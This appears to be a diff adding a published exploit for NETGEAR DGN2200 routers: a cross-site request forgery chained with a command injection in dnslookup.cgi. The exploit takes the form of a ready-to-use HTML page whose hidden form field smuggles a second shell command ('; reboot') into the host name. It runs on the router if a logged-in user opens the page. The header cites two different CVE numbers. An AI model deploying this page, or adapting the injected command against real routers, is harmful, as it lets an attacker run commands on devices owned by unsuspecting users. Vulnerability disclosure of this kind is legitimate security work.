@@ -1,0 +1,26 @@
+# Exploit Title: NETGEAR Firmware DGN2200v1/v2/v3/v4 CSRF which leads to RCE through CVE-2017-6334
+# Date: 2017-02-28
+# Exploit Author: SivertPL
+# Vendor Homepage: http://netgear.com/
+# Software Link: http://www.downloads.netgear.com/files/GDC/DGN2200/DGN2200%20Firmware%20Version%201.0.0.20%20-%20Initial%20Release%20(NA).zip
+# Version: 10.0.0.20 (initial) - 10.0.0.50 (latest, still 0-day!)
+# Tested on: DGN2200v1,v2,v3,v4
+
+# CVE: CVE-2017-6366
+
+A quite dangerous CSRF was discovered on all DGN2200 firmwares.
+When chained with either CVE-2017-6077 or CVE-2017-6334, allows for unauthenticated (sic!) RCE after tricking somebody logged in to the router to view a website.
+
+<!DOCTYPE html>
+<html>
+	<title>netgear router CSRF</title>
+	<body>
+		<form method="POST" action="http://192.168.0.1/dnslookup.cgi">
+			<input type="hidden" name="host_name" value="www.google.com; reboot"> <!-- CVE-2017-6334 payload -->
+			<input type="hidden" name="lookup" value="Lookup">
+			<button name="clc" value="clc">Would You Dare To?</button> 
+		</form>
+	</body>
+</html>
+
+<!-- 2017-02-27 by SivertPL -->
